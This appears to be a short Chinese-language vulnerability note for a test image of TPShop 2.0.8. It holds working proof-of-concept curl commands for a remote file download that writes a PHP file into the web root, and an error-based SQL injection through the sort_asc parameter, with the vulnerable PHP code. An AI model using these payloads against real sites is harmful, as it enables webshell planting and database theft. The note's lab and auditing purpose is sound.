### Home/test/dlfile 远程文件下载

测试镜像

* src/topshop/2.0.8/

影响版本

* 2.0.8

参考链接

* [【PHP代码审计】TPShop漏洞集合](https://mp.weixin.qq.com/s/TNuM8q8JZsFR_46j5LemMw)

Poc

```
curl 'http://127.0.0.1/index.php/Home/test/dlfile' -d 'file_url=http://127.0.0.1/robots.txt&save_to=/var/www/html/robots.php'
curl 127.0.0.1/robots.php
```

### shop_price sort_asc 参数报错注入

测试镜像

* src/topshop/2.0.8/

影响版本

* 2.0.8

参考链接

* [【PHP代码审计】TPShop漏洞集合](https://mp.weixin.qq.com/s/TNuM8q8JZsFR_46j5LemMw)

Poc

```
curl 'http://127.0.0.1/index.php/Home/Goods/goodsList/id/1/sort/shop_price/sort_asc/,(updatexml(2,concat(0x7e,(version())),0))'
```

关键代码

```
# 获取参数
$sort_asc = I('get.sort_asc','asc');

...

# 注入
$goods_list = M('goods')->where(['is_on_sale' => 1, 'goods_id' => ['in', implode(',', $filter_goods_id)]])->order("$sort $sort_asc")->limit($page->firstRow . ',' . $page->listRows)->select();
```

